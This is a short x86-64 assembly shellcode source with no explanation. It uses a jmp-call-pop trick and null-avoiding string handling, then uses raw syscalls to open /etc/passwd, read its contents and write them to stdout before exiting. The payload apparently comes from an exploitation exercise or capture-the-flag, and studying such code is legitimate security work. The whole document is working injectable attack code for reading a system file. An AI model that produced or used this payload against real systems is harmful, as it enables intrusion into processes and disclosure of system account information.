        .intel_syntax noprefix
        .globl _start
_start:
        jmp caller
callee:
        pop rdi
        xor rcx, rcx
        mov cl, [rdi]
        inc rdi
        mov [rdi+rcx], ch
main:
        xor rsi, rsi
        push 2
        pop rax
        syscall
        xchg rdi, rax
        xchg rsi, rax
        push 1
        pop rdx
        shl rdx, 16
        xor rax, rax
        syscall
        xchg rdx, rax
        push 1
        pop rdi
        shr rax, 16
        syscall
        xor rdi, rdi
        push 60
        pop rax
        syscall
caller:
        call callee
arg:
        .byte 11
        .ascii "/etc/passwd"
